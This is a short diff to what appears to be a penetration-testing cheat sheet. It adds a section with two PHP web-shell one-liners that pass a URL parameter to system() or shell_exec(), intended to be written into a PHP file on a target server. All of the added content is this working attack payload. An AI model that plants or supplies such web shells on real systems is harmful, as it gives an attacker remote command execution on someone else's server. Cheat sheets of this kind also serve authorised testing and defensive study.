@@ -10,6 +10,14 @@ Description
 string shell_exec ( string $cmd )
 
 
+INTO PHP FILE
+==============
+<?php echo system($_GET["cmd"]);?>
+
+#Alternative
+<?php echo shell_exec($_GET["cmd"]);?>
+
+
 ON MYSQL
 ========
 
